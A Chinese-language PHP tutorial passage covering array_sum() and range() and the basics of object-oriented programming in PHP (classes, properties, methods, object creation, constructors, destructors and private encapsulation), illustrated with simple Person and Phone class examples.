<h4><span id="函数array_sum">函数array_sum()</span></h4><p>array_sum()函数返回数组中所有值的总和。只需要换入一个数组作为必选参数即可。如果所有值都是整数，则返回一个整数值，如果其中有一个或多个值是浮点数，则返回浮点数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a=array(0=&gt;&quot;5&quot;,1=&gt;&quot;15&quot;,2=&gt;&quot;25&quot;);</span><br><span class="line">	echo array_sum($a);               //使用array_sum()函数返回数组中元素的总各，输出：45</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数range">函数range()</span></h4><p>range()函数创建并返回一个包含指定范围的元素的数组。该函数需要三个参数，第一个参数first为必选项，规定数组元素的最小值。第二个参数second也是必选项，规定数组中元素的最大值。第三个参数step是可选的，规定元素之间的步进制，默认为1。该函数创建一个数组，包含从first到second（包含）之间的整数或字符。如果second比first小，则返回反序的数组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$number = range(0,5);  	   //使用range()函数声明元素值为0-5的数组</span><br><span class="line">	print_r ($number);         //获得的数组输出Array ( [0] =&gt; 0 [1] =&gt; 1 [2] =&gt; 2 [3] =&gt; 3 [4] =&gt; 4 [5] =&gt; 5 ) </span><br><span class="line"></span><br><span class="line">	$number = range(0,50,10);  //使用range()函数声明元素值为0-50的数组，每个元素之间的步长为10</span><br><span class="line">	print_r ($number);         //输出Array ( [0] =&gt; 0 [1] =&gt; 10 [2] =&gt; 20 [3] =&gt; 30 [4] =&gt; 40 [5] =&gt; 50 ) </span><br><span class="line"></span><br><span class="line">	$letter = range(&quot;a&quot;,&quot;d&quot;);  //还可以使用range()函数声明元素连续的字母数组，声明字母a-d的数组</span><br><span class="line">	print_r ($letter);         //获得的数组输出Array ( [0] =&gt; a [1] =&gt; b [2] =&gt; c [3] =&gt; d ) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h1><span id="php面向对象的程序设计">PHP面向对象的程序设计</span></h1><h2><span id="如何抽象一个类">如何抽象一个类</span></h2><h3><span id="类的声明">类的声明</span></h3><p>使用一个关键词class后面加上一个自定义的类别名称，以及加上一对花括号就可以了。有时也需要在class关键字的前面加一些修饰类的关键字。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[一些修饰类的关键字]class 类名｛				//使用class关键字加空格再加上类名，后面加上一对花括号</span><br><span class="line">		类中成员;				//类中的成员可以成员属性和成员方法</span><br><span class="line">｝							//使用花括号结束类的声明</span><br></pre></td></tr></table></figure>
<p>类名和变量名还有函数名命名规则相似，都需要遵守PHP中自定义名称的命名规则，如果由多个单词组成，习惯上每个单词的首字母要大写。另外类名的定义也要具有一定的意义，不要随便由几个字母组成。</p>
<h3><span id="成员属性">成员属性</span></h3><p>在类中直接声明变量就称为成员属性，可以在类中声明多个变量，即对象中有多个成员属性，每个变量都存储对象不同的属性信息。成员属性可以使用PHP中的标量类型和复合类型，所以也可以是其他类实例化的对象，但在类中使用资源和空类型没有意义。另外，虽然在声明成员属性时可以给变量赋予初值，但是在声明类时没有必要的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Person&#123;</span><br><span class="line">	var $name;			//第一个成员属性，用于存储人的名字</span><br><span class="line">	var $age;			//第二个成员属性，用于存储人的年龄</span><br><span class="line">	var $sex;			//第三个成员属性，用于存储人的性别</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在成员属性前可以加public,private,static等关键字来修饰，一旦成员属性有其他的关键字修饰就需要去掉”var”。</p>
<h3><span id="成员方法">成员方法</span></h3><p>在对象中需要声明一些可以操作本对象成员属性的一些方法，来完成对象的一些行为。在类中直接声明的函数就称为成员方法，可以在类中声明多个函数，即对象中就有多个成员方法。成员方法的声明和函数的声明完全一样，只不过可以加上一些关键字的修饰来控制成员方法的一些权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Phone &#123;                      //声明电话类</span><br><span class="line">        	//声明4个与电话有关的成员属性</span><br><span class="line">		var $Manufacturers;        //第一个成员属性，用于存储电话的厂商</span><br><span class="line">		var $color;                //第二个成员属性，用来设置电话的外关颜色</span><br><span class="line">		var $Battery_capacity;     //第三个成员属性，用来定义电话的电池容量</span><br><span class="line">		var $screen_size;          //第四个成员属性，用来定义电话的屏幕尺寸</span><br><span class="line"></span><br><span class="line">		function call()&#123;          //第一个成员方法用来声明电话具有接打电话的功能</span><br><span class="line">		    	//方法体，可以是打电话的具体内容</span><br><span class="line">               		echo &quot;正在打电话&quot;;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function message()&#123;       //第二个成员方法用来声明电话具有发信息的功能</span><br><span class="line">		        //方法体，可以是发送的具体信息</span><br><span class="line">               		echo &quot;正在发信息&quot;;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function playMusic() &#123;    //第三个成员方法用来声明电话具有播放音乐的功能</span><br><span class="line">		    	//方法体，可以是播放的具体音乐</span><br><span class="line">             		echo &quot;正在播放音乐&quot;;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function photo() &#123;         //第四个成员方法用来声明电话具有拍照的功能</span><br><span class="line">		     	//方法体，可以是拍照的整个过程</span><br><span class="line">               		echo &quot;正在拍照&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="通过类实例化对象">通过类实例化对象</span></h2><h3><span id="创建对象">创建对象</span></h3><p>将类实例化成对象使用new关键字并在后面加上一个和类名同名的方法即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$变量名=new 类名称([参数数列表])；   //对象实例化格式</span><br></pre></td></tr></table></figure></p>
<p>其中，“$变量名”是通过类所创建的一个对象的引用名称，将来通过这个引用来访问对象中的成员。new表明要创建一个新的对象，类名表示新对象的类型，而参数指定了类的构造方法用于初始化对象值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Phone &#123;             //声明一个电话类Phone</span><br><span class="line">		//类中成员同上（略）</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	class Person &#123;            //声明一个人类Person</span><br><span class="line">		//类中成员同上（略）</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//通过Person类实例化三个对象$person1、$person2、$person3</span><br><span class="line">	$person1=new Person();    //创建第一个Person类对象,引用名为$person1</span><br><span class="line">	$person2=new Person();    //创建第二个Person类对象,引用名为$person2</span><br><span class="line">	$person3=new Person();    //创建第三个Person类对象,引用名为$person3</span><br><span class="line"></span><br><span class="line">	//通过Phone类实例化三个对象$phone1、$phone2、$phone3</span><br><span class="line">	$phone1=new Phone();    //创建第一个Phone类对象,引用名为$phone1</span><br><span class="line">	$phone2=new Phone();    //创建第二个Phone类对象,引用名为$phone2</span><br><span class="line">	$phone3=new Phone();    //创建第三个Phone类对象,引用名为$phone3</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="对象类型在内存中的分配">对象类型在内存中的分配</span></h3><p>对象类型和整型、字符串等类型一样，也是PHP中的一种数据类型。逻辑上内存大体上被分为四段，分别为栈空间段、堆空间段、初始化数据段和代码段，程序中不同类型数据的声明将会被存放在不同的内存段里面。</p>
<h4><span id="栈空间段">栈空间段</span></h4><p>栈的特点是空间小但被CPU访问的速度快，是用户存放程序中临时创建的变量。由于栈的后进先出特点，所以栈特别方便用来保存和恢复调用现场。</p>
<h4><span id="堆空间段">堆空间段</span></h4><p>堆是用于存放进程运行中被动态分配的内存段，它大小并不固定，可动态扩张或所建。用于存储数据长度可变或占用内存比较大的数据。</p>
<h4><span id="数据段">数据段</span></h4><p>数据段用来存放可执行文件中已初始化全局变量，就是存放程序静态分配的变量。</p>
<h4><span id="代码段">代码段</span></h4><p>代码段是用来存放可执行文件的操作指令，也就是说它是可执行程序在内存中的镜像。代码段需要防止在运行时被非法修改，所以只准读取操作，不允许写入操作。</p>
<h3><span id="对象中成员的访问">对象中成员的访问</span></h3><p>对象中包含成员属性和成员方法，访问对象中的成员则包括成员属性的访问和成员方法的访问。而对成员属性的访问则又包括赋值操作和获取成员属性值的操作。访问对象中的成员和访问数组中的元素类似，只能通过对象的引用来访问对象中的每个成员。但还要使用一个特殊的运算符号“-&gt;”来完成对象成员的访问。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$引用名=new 类名称([参数数列表]);	//对象实例化格式</span><br><span class="line">$引用名-&gt;成员属性=值;				//对象成员属性赋值的操作</span><br><span class="line">echo $引用名-&gt;成员属性;				//获取成员属性的值</span><br><span class="line">$引用名-&gt;成员方法;				//访问对象中的成员方法</span><br></pre></td></tr></table></figure></p>
<p>只要是对象中的成员都要使用“对象引用名-&gt;属性”或“对象引用名-&gt;方法”形式访问。如果对象中的成员不是静态的，这是唯一的访问形式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Person           //声明一个人类Person，其中包含三个成员属性和两个成员方法</span><br><span class="line">	&#123;</span><br><span class="line">		//下面是声明人的三个成员属性</span><br><span class="line">		var $name;       //第一个成员属性$name定义人的名子</span><br><span class="line">		var $sex;        //第二个成员性性$sex定义人的性别</span><br><span class="line">		var $age;        //第三个成员性成定义人的年龄</span><br><span class="line"></span><br><span class="line">		//下面是声明人的两个成员方法</span><br><span class="line">		function say()    //这个人可以说话的方法</span><br><span class="line">		&#123;</span><br><span class="line">			echo &quot;这个人在说话&lt;br&gt;&quot;;   //在方法体中可以有更多内容</span><br><span class="line">		&#125;		</span><br><span class="line"></span><br><span class="line">		function run()     //这个人可以走路的方法</span><br><span class="line">		&#123;</span><br><span class="line">			echo &quot;这个人在走路&lt;br&gt;&quot;;   //在方法体中可以有更多内容</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//下面三行通过new关键字实例化person类的三个实例对象</span><br><span class="line">	$person1=new Person();  //通过类Person创建第一个实例对象$person1</span><br><span class="line">	$person2=new Person();  //通过类person创建第二个实例对象$person2</span><br><span class="line">	$person3=new Person();  //通过类person创建第三个实例对象$person3</span><br><span class="line"></span><br><span class="line">	//下面三行是给$person1对象中属性初使化赋值</span><br><span class="line">	$person1-&gt;name=&quot;张三&quot;;     //将对象person1中的$name属性赋值为张三 </span><br><span class="line">	$person1-&gt;sex=&quot;男&quot;;        //将对象person1中的$sex属性赋值为男</span><br><span class="line">	$person1-&gt;age=20;          //将对象person1中的$age属性赋值为20</span><br><span class="line"></span><br><span class="line">	//下面三行是给$person2对象中属性初使化赋值</span><br><span class="line">	$person2-&gt;name=&quot;李四&quot;;     //将对象person2中的$name属性赋值为李四</span><br><span class="line">	$person2-&gt;sex=&quot;女&quot;;        //将对象person2中的$sex属性赋值为女</span><br><span class="line">	$person2-&gt;age=30;          //将对象person2中的$age属性赋值为30</span><br><span class="line"></span><br><span class="line">	//下面三行是给$person3对象中属性初使化赋值</span><br><span class="line">	$person3-&gt;name=&quot;王五&quot;;     //将对象person3中的$name属性赋值为王五</span><br><span class="line">	$person3-&gt;sex=&quot;男&quot;;        //将对象person3中的$sex属性赋值为男</span><br><span class="line">	$person3-&gt;age=40;          //将对象person3中的$age属性赋值为40</span><br><span class="line">	</span><br><span class="line">	//下面三行是访问$person1对象中的成员属性</span><br><span class="line">	echo &quot;person1对象的名子是：&quot;.$person1-&gt;name.&quot;&lt;br&gt;&quot;;  //输出对象$person1中的成员属性$name的值</span><br><span class="line">	echo &quot;person1对象的性别是：&quot;.$person1-&gt;sex.&quot;&lt;br&gt;&quot;;    //输出对象$person1中的成员属性$sex的值</span><br><span class="line">	echo &quot;person1对象的年龄是：&quot;.$person1-&gt;age.&quot;&lt;br&gt;&quot;;    //输出对象$person1中的成员属性$age的值</span><br><span class="line"></span><br><span class="line">	//下面两行访问$person1对象中的方法</span><br><span class="line">	$person1-&gt;say();          //访问第一个对象$person1中的成员方法say(),让第一个人说话</span><br><span class="line">	$person1-&gt;run();          //访问第一个对象$person1中的成员方法run(),让第一个人走路</span><br><span class="line"></span><br><span class="line">	//下面三行是访问$person2对象中的成员属性</span><br><span class="line">	echo &quot;person2对象的名子是：&quot;.$person2-&gt;name.&quot;&lt;br&gt;&quot;;  //输出对象$person2中的成员属性$name的值</span><br><span class="line">	echo &quot;person2对象的性别是：&quot;.$person2-&gt;sex.&quot;&lt;br&gt;&quot;;    //输出对象$person2中的成员属性$sex的值</span><br><span class="line">	echo &quot;person2对象的年龄是：&quot;.$person2-&gt;age.&quot;&lt;br&gt;&quot;;    //输出对象$person2中的成员属性$age的值</span><br><span class="line"></span><br><span class="line">	//下面两行访问$person2对象中的方法</span><br><span class="line">	$person2-&gt;say();          //访问第二个对象$person2中的成员方法say(),让第二个人说话</span><br><span class="line">	$person2-&gt;run();          //访问第二个对象$person2中的成员方法run(),让第二个人走路</span><br><span class="line"></span><br><span class="line">	//下面三行是访问$person3对象中的成员属性</span><br><span class="line">	echo &quot;person3对象的名子是：&quot;.$person3-&gt;name.&quot;&lt;br&gt;&quot;;  //输出对象$person3中的成员属性$name的值</span><br><span class="line">	echo &quot;person3对象的性别是：&quot;.$person3-&gt;sex.&quot;&lt;br&gt;&quot;;    //输出对象$person3中的成员属性$sex的值</span><br><span class="line">	echo &quot;person3对象的年龄是：&quot;.$person3-&gt;age.&quot;&lt;br&gt;&quot;;    //输出对象$person3中的成员属性$age的值</span><br><span class="line"></span><br><span class="line">	//下面两行访问$person3对象中的方法</span><br><span class="line">	$person3-&gt;say();          //访问第三个对象$person3中的成员方法say(),让第三个人说话</span><br><span class="line">	$person3-&gt;run();          //访问第三个对象$person3中的成员方法run(),让第三个人走路</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="构造方法与析构方法">构造方法与析构方法</span></h3><p>构造方法是对象创建完成后第一个被对象自动调用的方法，而析构方法是对象在销毁之前最后一个被对象自动调用的方法。</p>
<h4><span id="构造方法">构造方法</span></h4><p>当创建一个对象时，构造方法就会被自动调用一次，即每次使用关键字new来实例化对象时都会自动调用构造方法，不能主动通过对象的引用调用构造方法。所以通常使用构造方法执行一些有用的初始化任务。<br>在类中声明构造方法和声明其他的成员方法相似，但是构造方法的方法名称必须是以两个下划线开始的“__construct()”，这是PHP5中的变化，在PHP5之前的版本中，构造方法是方法名称必须与类名相同，这种方式在PHP5中仍然可以用。但在PHP5中很少声明和类名同名的构造方法了，这样做的好处是可以使构造函数独立于类名，当类名发生变化时不需要更改相应的构造函数名称</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function __construct([参数列表])｛		//构造方法名称是以两个下划线开始的__construct()</span><br><span class="line">	//方法体，通常用来对成员属性进行初始化赋值</span><br><span class="line">｝</span><br></pre></td></tr></table></figure>
<p>在PHP中，同一个类中只能声明一个构造方法。原因是构造方法名称是固定的，在PHP中不能声明同名的两个函数，所以也就没有构造方法重载。但可以在声明构造方法时使用默认参数，实现其他面向对象的编程语言中构造方法重载的功能。这样在创建对象时，如果在构造方法中没有传入参数则使用默认参数为成员属性进行初始化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Person &#123;         //声明一个人类Person，其中声明一个构造方法</span><br><span class="line">		//下面是声明人的成员属性，都是没有初值的，在创建对象时，使用构造方法赋初值</span><br><span class="line">		var $name;       //第一个成员属性$name定义人的名子</span><br><span class="line">		var $sex;        //第二个成员属性$sex定义人的性别</span><br><span class="line">		var $age;        //第三个成员属性$age定义人的年龄</span><br><span class="line"></span><br><span class="line">		//声明一个构造方法，将来创建对象时，为对象的成员属性赋予初值，参数中都使用了默认参数</span><br><span class="line">		function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;</span><br><span class="line">			$this-&gt;name = $name;  //在创建对象时，使用传入的参数$name为成员属性$this-&gt;name赋初值</span><br><span class="line">			$this-&gt;sex = $sex;     //在创建对象时，使用传入的参数$sex为成员属性$this-&gt;sex赋初值</span><br><span class="line">			$this-&gt;age = $age;     //在创建对象时，使用传入的参数$age为成员属性$this-&gt;age赋初值</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//下面是声明人的成员方法</span><br><span class="line">		function say()&#123; //在类中声明说话的方法，使用$this访问自已对象内部的成员属性</span><br><span class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot;， 性别：&quot;.$this-&gt;sex.&quot;， 我的年龄是：&quot;.$this-&gt;age.&quot;。&lt;br&gt;&quot;;</span><br><span class="line">		&#125;		</span><br><span class="line"></span><br><span class="line">		function run()&#123; //在类中声明另一个方法 </span><br><span class="line">			echo $this-&gt;name.&quot;在走路&lt;br&gt;&quot;;    //使用$this访问本对象中的$name属性</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//下面三行中实例化person类的三个实例对象，并使用构造方法分别为新创建的对象成员属性赋予初值</span><br><span class="line">	$person1=new Person(&quot;张三&quot;, &quot;男&quot;, 20); //创建对象$person1时会自动执行构造方法，将全部参数传给它</span><br><span class="line">	$person2=new Person(&quot;李四&quot;, &quot;女&quot;);    //创建对象$person2时会自动执行构造方法，传入前两个参数</span><br><span class="line">	$person3=new Person(&quot;王五&quot;);         //创建对象$person3时会自动执行构造方法，只传入一个参数</span><br><span class="line"></span><br><span class="line">	$person1-&gt;say();     //使用$person1访问它中的say()方法</span><br><span class="line">	$person2-&gt;say();     //使用$person2访问它中的say()方法</span><br><span class="line">	$person3-&gt;say();     //使用$person3访问它中的say()方法</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="析构方法">析构方法</span></h4><p>PHP将在对象被销毁前自动调用析构方法。析构方法是PHP中新添加的内容，在PHP4中并没有提供。析构方法允许在销毁一个对象之前执行一些特定操作。<br>当堆内存段中的对象失去访问它的引用时，它就不能被访问了，也就称为垃圾对象了。通常对象的引用被赋予其他的值或者是在页面运行结束时，对象都会失去引用。<br>析构方法的声明格式与构造方法相似，在类中声明的析构方法名称也是固定的，也是以两个下划线开头的方法名“__destruct()”，而且析构函数不能带有任何参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function __destruct()		//析构方法名称是以两个下划线开始的__destruct()</span><br><span class="line">	//方法体，通常用来完成一些在对象销毁前的清理任务</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Person &#123;             //声明一个人类Person，其中包含三个成员属性和两个成员方法</span><br><span class="line">		//下面是声明人的成员属性</span><br><span class="line">		var $name;          //第一个成员属性$name定义人的名子</span><br><span class="line">		var $sex;            //第二个成员属性$sex定义人的性别</span><br><span class="line">		var $age;            //第三个成员属性$age定义人的年龄</span><br><span class="line"></span><br><span class="line">		//声明一个构造方法，将来创建对象时，为对象的成员属性赋予初值</span><br><span class="line">		function __construct($name, $sex, $age) &#123;</span><br><span class="line">			$this-&gt;name = $name;   //在创建对象时，使用传入的参数$name为成员属性$this-&gt;name赋初值</span><br><span class="line">			$this-&gt;sex = $sex;      //在创建对象时，使用传入的参数$sex为成员属性$this-&gt;sex赋初值</span><br><span class="line">			$this-&gt;age = $age;      //在创建对象时，使用传入的参数$age为成员属性$this-&gt;age赋初值</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//下面是声明人的成员方法</span><br><span class="line">		function say()&#123;             //在类中声明说话的方法，使用$this访问自已对象内部的成员属性</span><br><span class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot;， 性别：&quot;.$this-&gt;sex.&quot;， 我的年龄是：&quot;.$this-&gt;age.&quot;。&lt;br&gt;&quot;;</span><br><span class="line">		&#125;		</span><br><span class="line"></span><br><span class="line">		function run() &#123;            //在类中声明另一个方法 </span><br><span class="line">			echo $this-&gt;name.&quot;在走路&lt;br&gt;&quot;;    //使用$this访问本对象中的$name属性</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		function __destruct() &#123;</span><br><span class="line">			echo &quot;再见&quot;.$this-&gt;name.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//下面三行通过new关键字实例化person类的三个实例对象</span><br><span class="line">	$person1=new Person(&quot;张三&quot;, &quot;男&quot;, 20);     //创建对象$person1 </span><br><span class="line">	$person1=null;              //将第一个对象的引用$person1赋值为其它的值，第一个对象将失去引用</span><br><span class="line">	$person2=new Person(&quot;李四&quot;, &quot;女&quot;, 30);     //创建对象$person2 </span><br><span class="line">	$person3=new Person(&quot;王五&quot;, &quot;男&quot;, 40);      //创建对象$person3 </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="封装性">封装性</span></h2><p>封装性就是把对象的成员属性和成员方法结合成一个独立的相同单位，并尽可能隐蔽对象的内部细节，包含两个含义：</p>
<ul>
<li>把对象的全部成员属性和全部成员方法结合在一起，形参一个不可分隔的独立单位（即对象）。</li>
<li>信息隐蔽，即尽可能隐蔽对象的内部细节，对外形成一个边界，只保留有限的对外接口使之与外部发生联系。</li>
</ul>
<h3><span id="设置私有成员">设置私有成员</span></h3><p>只要在声明成员属性或成员方法时，使用private关键字修饰就实现了对成员的封装。封装后的成员在对象的外部不能被访问，但在对象内部的成员方法中可以访问到自己对象内部被封装的成员属性和被封装的成员方法。达到了对对象成员保护的目的，只能是对象自己使用，其他人不可以访问自己的私有成员。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">	class Person  &#123;            //声明一个人类Person，其中包含的三个成员属性被封装起来</span><br><span class="line">		//下面是声明人的成员属性，全都使用了private关键字封装</span><br><span class="line">		private $name;       //第一个成员属性$name定义人的名子，此属性被封装</span><br><span class="line">		private $sex;         //第二个成员属性$sex定义人的性别，此属性被封装</span><br><span class="line">		private $age;         //第三个成员属性$age定义人的年龄，此属性被封装</span><br><span class="line"></span><br><span class="line">		//声明一个构造方法，将来创建对象时，为对象的成员属性赋予初值</span><br><span class="line">	     	function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;</span><br><span class="line">			$this-&gt;name = $name;    //使用传入的参数$name为成员属性$this-&gt;name赋初值</span><br><span class="line">			$this-&gt;sex = $sex;       //使用传入的参数$sex为成员属性$this-&gt;sex赋初值</span><br><span class="line">			$this-&gt;age = $age;       //使用传入的参数$age为成员属性$this-&gt;age赋初值</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function run()&#123;              //在类中声明一个走路方法，调用两个内部的私有方法完成</span><br><span class="line">			echo $this-&gt;name.&quot;在走路时&quot;.$this-&gt;leftLeg().&quot;再&quot;.$this-&gt;rightLeg().&quot;&lt;br&gt;&quot;;	</span><br><span class="line">		&#125;</span><br><span class="line">         </span><br><span class="line">		private function leftLeg() &#123;    //声明一个迈左腿的方法，被封装所以只能在内部使用</span><br><span class="line">			return &quot;迈左腿&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">         </span><br><span class="line">		private function rightLeg() &#123;   //声明一个迈右腿的方法，被封装所以只能在内部使用</span><br><span class="line">			return &quot;迈右腿&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$person1=new Person();         //创建对象$person1 </span><br><span class="line">	$person1-&gt;run();               //run()的方法没有被封装，所以可以在对象外部使用</span><br><span class="line">	$person1-&gt;name=&quot;李四&quot;;        //name属性被封装，不能在对象外部给私有属性赋值</span><br><span class="line">	echo $person1-&gt;age;            //age属性被封装，不能在对象的外部获取私有属性的值</span><br><span class="line">	$person1-&gt;leftLeg();            //leftLeg()方法被封装，不能在对象外面调用对象中私有的方法</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
